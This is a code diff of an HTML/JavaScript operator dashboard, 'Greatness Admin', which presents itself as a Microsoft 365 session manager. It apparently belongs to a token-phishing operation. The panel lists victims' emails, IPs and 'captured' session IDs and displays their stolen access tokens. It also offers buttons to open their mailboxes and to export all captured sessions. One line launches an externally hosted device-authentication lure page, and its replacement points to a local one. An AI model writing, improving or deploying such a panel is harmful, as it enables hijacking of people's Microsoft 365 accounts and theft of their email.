@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Greatness Admin Dashboard - Live Sessions</title>
+    <title>Greatness Admin Dashboard - Session Manager</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -38,13 +38,17 @@
         .view-token-btn:hover { background: #059669; }
         .open-email-btn:hover { background: #2563eb; }
         .badge { background: #1e3a5f; padding: 4px 12px; border-radius: 20px; font-size: 11px; color: #60a5fa; }
-        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 600px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
-        .token-modal pre { background: #0a0e27; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 11px; margin: 15px 0; }
+        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 700px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; box-shadow: 0 20px 40px rgba(0,0,0,0.5); max-height: 80vh; overflow-y: auto; }
+        .token-modal pre { background: #0a0e27; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 11px; margin: 15px 0; white-space: pre-wrap; word-break: break-all; }
         .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
         .close-modal { background: #ef4444; margin-top: 10px; }
         .custom-legend { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px; justify-content: center; }
         .legend-item { display: flex; align-items: center; gap: 8px; font-size: 12px; }
         .legend-color { width: 20px; height: 20px; border-radius: 4px; }
+        .loading { text-align: center; padding: 40px; color: #6b7280; }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .token-preview { font-family: monospace; font-size: 11px; background: #0a0e27; padding: 10px; border-radius: 6px; margin-top: 10px; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -52,37 +56,37 @@
     <div class="header">
         <div class="logo">
             <h1>Greatness Admin</h1>
-            <p>Live Microsoft 365 Session Manager</p>
+            <p>Microsoft 365 Session Manager</p>
         </div>
         <div class="badge" id="sessionCount">0 Active Sessions</div>
     </div>
 
     <div class="stats-grid">
         <div class="stat-card">
-            <div class="stat-title">Total Visits</div>
-            <div class="stat-value" id="totalVisits">0</div>
+            <div class="stat-title">Total Sessions</div>
+            <div class="stat-value" id="totalSessions">0</div>
         </div>
         <div class="stat-card">
-            <div class="stat-title">Active Sessions</div>
-            <div class="stat-value" id="activeSessions">0</div>
+            <div class="stat-title">Active Tokens</div>
+            <div class="stat-value" id="activeTokens">0</div>
         </div>
         <div class="stat-card">
-            <div class="stat-title">Total Users</div>
+            <div class="stat-title">Unique Users</div>
             <div class="stat-value" id="totalUsers">0</div>
         </div>
         <div class="stat-card">
-            <div class="stat-title">Countries</div>
-            <div class="stat-value" id="totalCountries">0</div>
+            <div class="stat-title">Last Capture</div>
+            <div class="stat-value" id="lastCapture" style="font-size: 14px;">-</div>
         </div>
     </div>
 
     <div class="main-grid">
         <div class="card">
-            <h3>Visits (Last 12 Months)</h3>
-            <canvas id="visitsChart"></canvas>
+            <h3>Authentication Activity</h3>
+            <canvas id="activityChart"></canvas>
         </div>
         <div class="card">
-            <h3>Active Sessions by Region</h3>
+            <h3>Sessions by IP</h3>
             <canvas id="sessionsChart"></canvas>
             <div class="custom-legend" id="customLegend"></div>
         </div>
@@ -105,22 +109,22 @@
             <h3>📋 User Sessions</h3>
             <button class="tool-btn" id="refreshTableBtn" style="padding: 8px 16px;">🔄 Refresh</button>
         </div>
-        <table>
+         <table>
             <thead>
                 <tr>
                     <th>Email</th>
                     <th>IP Address</th>
                     <th>User Agent</th>
-                    <th>Country</th>
-                    <th>Last Active</th>
+                    <th>Session ID</th>
+                    <th>Captured At</th>
                     <th>View Token</th>
                     <th>Action</th>
                 </tr>
             </thead>
             <tbody id="sessionsTableBody">
-                <tr><td colspan="7" style="text-align: center;">No sessions yet. Click "Add Microsoft Account" to authenticate.</td></tr>
+                <tr><td colspan="7" style="text-align: center;">Loading sessions...</td></tr>
             </tbody>
-        </table>
+         </table>
     </div>
 </div>
 
@@ -132,9 +136,8 @@
 </div>
 
 <script>
-    let visitsChart, sessionsChart;
-    let countryData = {};
-
+    let activityChart, sessionsChart;
+    
     async function apiCall(endpoint, options = {}) {
         try {
             const response = await fetch(endpoint, {
@@ -167,49 +170,49 @@
         }
         
         tbody.innerHTML = sessions.map(session => `
-            <td>
-                <td>${escapeHtml(session.email)}</td>
+            <tr>
+                <td style="color: #60a5fa; font-weight: 500;">${escapeHtml(session.email)}</td>
                 <td><code>${escapeHtml(session.ip || 'Unknown')}</code></td>
                 <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(session.userAgent || 'Unknown')}">
-                    ${escapeHtml((session.userAgent || 'Unknown').substring(0, 50))}...
+                    ${escapeHtml((session.userAgent || 'Unknown').substring(0, 40))}...
                 </td>
-                <td>${escapeHtml(session.country || 'Unknown')}</td>
-                <td>${escapeHtml(session.lastActive || new Date().toLocaleString())}</td>
-                <td><button class="view-token-btn" onclick="viewToken('${session.sessionId}')">🔑 View Token</button></td>
-                <td><button class="open-email-btn" onclick="openOutlook('${escapeHtml(session.email)}', '${session.sessionId}')">✉️ Open Email</button></td>
+                <td><code style="font-size: 11px;">${escapeHtml(session.sid || 'N/A')}</code></td>
+                <td>${formatDate(session.capturedAt)}</td>
+                <td><button class="view-token-btn" onclick="viewToken('${session.sid}')">🔑 View Token</button></td>
+                <td><button class="open-email-btn" onclick="openMailbox('${session.email}', '${session.sid}')">✉️ Open Email</button></td>
             </tr>
         `).join('');
     }
 
     function updateStats(sessions) {
-        document.getElementById('totalVisits').innerText = sessions.length;
-        document.getElementById('activeSessions').innerText = sessions.length;
+        document.getElementById('totalSessions').innerText = sessions.length;
+        document.getElementById('activeTokens').innerText = sessions.length;
         document.getElementById('totalUsers').innerText = sessions.length;
-        
-        const uniqueCountries = new Set(sessions.map(s => s.country).filter(c => c && c !== 'Unknown'));
-        document.getElementById('totalCountries').innerText = uniqueCountries.size || 1;
+        if (sessions.length > 0) {
+            document.getElementById('lastCapture').innerHTML = formatDate(sessions[0].capturedAt);
+        }
     }
 
     function updateCharts(sessions) {
         const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-        const visitData = new Array(12).fill(0);
+        const activityData = new Array(12).fill(0);
         
         sessions.forEach(session => {
-            if (session.createdAt) {
-                const month = new Date(session.createdAt).getMonth();
-                visitData[month]++;
+            if (session.capturedAt) {
+                const month = new Date(session.capturedAt).getMonth();
+                activityData[month]++;
             }
         });
         
-        if (visitsChart) visitsChart.destroy();
-        const ctx1 = document.getElementById('visitsChart').getContext('2d');
-        visitsChart = new Chart(ctx1, {
+        if (activityChart) activityChart.destroy();
+        const ctx1 = document.getElementById('activityChart').getContext('2d');
+        activityChart = new Chart(ctx1, {
             type: 'line',
             data: {
                 labels: months,
                 datasets: [{
                     label: 'Authentications',
-                    data: visitData,
+                    data: activityData,
                     borderColor: '#3b82f6',
                     backgroundColor: 'rgba(59,130,246,0.1)',
                     tension: 0.3,
@@ -224,36 +227,26 @@
             }
         });
         
-        const regionColors = {
-            'United States': '#B22234',
-            'Canada': '#FF0000',
-            'Germany': '#FFCC00',
-            'United Kingdom': '#00247D',
-            'France': '#0055A4',
-            'Japan': '#BC002D',
-            'Australia': '#012169',
-            'Other': '#6B8E23'
-        };
-        
-        const regionCount = {};
+        // IP distribution chart
+        const ipCount = {};
         sessions.forEach(session => {
-            const country = session.country || 'Other';
-            regionCount[country] = (regionCount[country] || 0) + 1;
+            const ip = session.ip || 'Unknown';
+            ipCount[ip] = (ipCount[ip] || 0) + 1;
         });
         
-        const regionLabels = Object.keys(regionCount);
-        const regionValues = Object.values(regionCount);
-        const regionColorsUsed = regionLabels.map(label => regionColors[label] || '#6B8E23');
+        const ipLabels = Object.keys(ipCount);
+        const ipValues = Object.values(ipCount);
+        const colors = ['#3b82f6', '#10b981', '#f59e0b', '#ef4444', '#8b5cf6', '#ec489a', '#06b6d4', '#84cc16'];
         
         if (sessionsChart) sessionsChart.destroy();
         const ctx2 = document.getElementById('sessionsChart').getContext('2d');
         sessionsChart = new Chart(ctx2, {
             type: 'doughnut',
             data: {
-                labels: regionLabels,
+                labels: ipLabels,
                 datasets: [{
-                    data: regionValues,
-                    backgroundColor: regionColorsUsed,
+                    data: ipValues,
+                    backgroundColor: colors.slice(0, ipLabels.length),
                     borderColor: '#111635',
                     borderWidth: 3,
                     hoverOffset: 8
@@ -261,35 +254,37 @@
             },
             options: {
                 responsive: true,
-                plugins: { legend: { display: false }, tooltip: { callbacks: { label: (ctx) => `${ctx.label}: ${ctx.raw} sessions` } } }
+                plugins: { legend: { display: false }, tooltip: { callbacks: { label: (ctx) => `${ctx.label}: ${ctx.raw} session(s)` } } }
             }
         });
         
         const legendContainer = document.getElementById('customLegend');
-        legendContainer.innerHTML = regionLabels.map((label, index) => `
+        legendContainer.innerHTML = ipLabels.map((label, index) => `
             <div class="legend-item">
-                <div class="legend-color" style="background: ${regionColorsUsed[index]};"></div>
+                <div class="legend-color" style="background: ${colors[index % colors.length]};"></div>
                 <span>${label}</span>
-                <span style="color: #8b8fbf;">(${regionValues[index]} sessions)</span>
+                <span style="color: #8b8fbf;">(${ipValues[index]} sessions)</span>
             </div>
         `).join('');
     }
 
-    async function viewToken(sessionId) {
-        const data = await apiCall(`/api/session/token/${sessionId}`);
+    async function viewToken(sid) {
+        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading token...</div>';
+        document.getElementById('tokenModal').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+        
+        const data = await apiCall(`/api/session/token/${sid}`);
         if (data && data.token) {
             const tokenHtml = `
-                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Expires:</strong> ${new Date(data.expiresAt).toLocaleString()}</p>
-                <p><strong>Access Token:</strong></p>
-                <pre>${escapeHtml(data.token.access_token)}</pre>
-                ${data.token.refresh_token ? `<p><strong>Refresh Token:</strong></p><pre>${escapeHtml(data.token.refresh_token)}</pre>` : ''}
+                <p><strong>📧 Email:</strong> ${escapeHtml(data.email)}</p>
+                <p><strong>🆔 Session ID:</strong> <code>${escapeHtml(sid)}</code></p>
+                <p><strong>🔑 Access Token:</strong></p>
+                <pre>${escapeHtml(data.token)}</pre>
+                <p style="font-size: 11px; color: #8b8fbf; margin-top: 10px;">⚠️ Token expires in 1 hour. Handle with care.</p>
             `;
             document.getElementById('tokenDetails').innerHTML = tokenHtml;
-            document.getElementById('tokenModal').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
         } else {
-            alert('Failed to load token details');
+            document.getElementById('tokenDetails').innerHTML = '<p style="color: #ef4444;">❌ Failed to load token. Session may have expired.</p>';
         }
     }
 
@@ -298,21 +293,18 @@
         document.getElementById('overlay').style.display = 'none';
     }
 
-    function openOutlook(email, sessionId) {
-        // Open the full mailbox interface in a new tab
-        window.open(`/mailbox.html?session=${sessionId}&email=${encodeURIComponent(email)}`, '_blank');
+    function openMailbox(email, sid) {
+        alert(`📧 Opening mailbox for: ${email}\n\nFull Outlook Web Access will be implemented in the next phase.`);
+        // window.open(`/mailbox.html?session=${sid}&email=${encodeURIComponent(email)}`, '_blank');
     }
 
     function openAddAccount() {
-        // Open your Cloudflare hosted device auth page
-        window.open('https://syexcv-linbasee444.pages.dev/', '_blank', 'width=600,height=700');
-        setTimeout(() => {
-            loadSessions();
-        }, 5000);
+        window.open('/generate-auth-page', '_blank', 'width=600,height=700');
+        setTimeout(() => loadSessions(), 3000);
     }
 
     async function clearAllSessions() {
-        if (confirm('⚠️ WARNING: This will delete all stored sessions and tokens. You will need to re-authenticate. Continue?')) {
+        if (confirm('⚠️ WARNING: This will delete ALL stored sessions and tokens. Continue?')) {
             await apiCall('/api/sessions/clear', { method: 'DELETE' });
             await loadSessions();
             alert('All sessions cleared');
@@ -320,9 +312,9 @@
     }
 
     async function exportData() {
-        const data = await apiCall('/api/sessions/export');
-        if (data) {
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const data = await apiCall('/api/sessions');
+        if (data && data.sessions) {
+            const blob = new Blob([JSON.stringify(data.sessions, null, 2)], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
@@ -330,6 +322,12 @@
             a.click();
             URL.revokeObjectURL(url);
         }
+    }
+
+    function formatDate(dateStr) {
+        if (!dateStr) return 'Unknown';
+        const date = new Date(dateStr);
+        return date.toLocaleString();
     }
 
     function escapeHtml(str) {
@@ -342,14 +340,17 @@
         });
     }
 
+    // Event handlers
     document.getElementById('refreshSessionsBtn').onclick = loadSessions;
     document.getElementById('refreshTableBtn').onclick = loadSessions;
     document.getElementById('clearAllSessionsBtn').onclick = clearAllSessions;
     document.getElementById('exportDataBtn').onclick = exportData;
     document.getElementById('addAccountBtn').onclick = openAddAccount;
     
-    setInterval(loadSessions, 10000);
+    // Auto-refresh every 15 seconds
+    setInterval(loadSessions, 15000);
     
+    // Initial load
     loadSessions();
 </script>
 </body>
